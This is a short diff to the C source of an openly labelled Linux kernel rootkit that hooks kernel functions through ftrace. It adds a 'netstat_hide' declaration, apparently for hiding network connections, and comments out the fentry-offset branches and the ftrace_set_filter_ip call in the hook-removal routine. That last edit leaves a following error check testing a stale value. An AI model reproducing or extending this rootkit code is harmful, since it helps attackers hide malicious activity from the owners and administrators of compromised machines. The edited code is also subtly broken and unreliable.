@@ -34,17 +34,17 @@ struct ftrace_hook {
 };
 
 
-
+static int netstat_hide(void);
 static void notrace register_callback_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
 	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
-#if USE_FENTRY_OFFSET
+/*#if USE_FENTRY_OFFSET
 	regs->ip = (unsigned long) hook->function;
-#else
+#else*/
 	if(!within_module(parent_ip, THIS_MODULE))
 		regs->ip = (unsigned long) hook->function;
-#endif
+//#endif
 }
 
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
@@ -57,11 +57,11 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 		return -ENOENT;
 	}
 
-#if USE_FENTRY_OFFSET
+/*#if USE_FENTRY_OFFSET
 	*((unsigned long*) hook->original) = hook->addr + MCOUNT_INSN_SIZE;
-#else
+#else*/
 	*((unsigned long*) hook->original) = hook->addr;
-#endif
+//#endif
 
 	return 0;
 }
@@ -93,7 +93,7 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
 	}
 
-	err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
+	//err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
 	if(err)
 	{
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
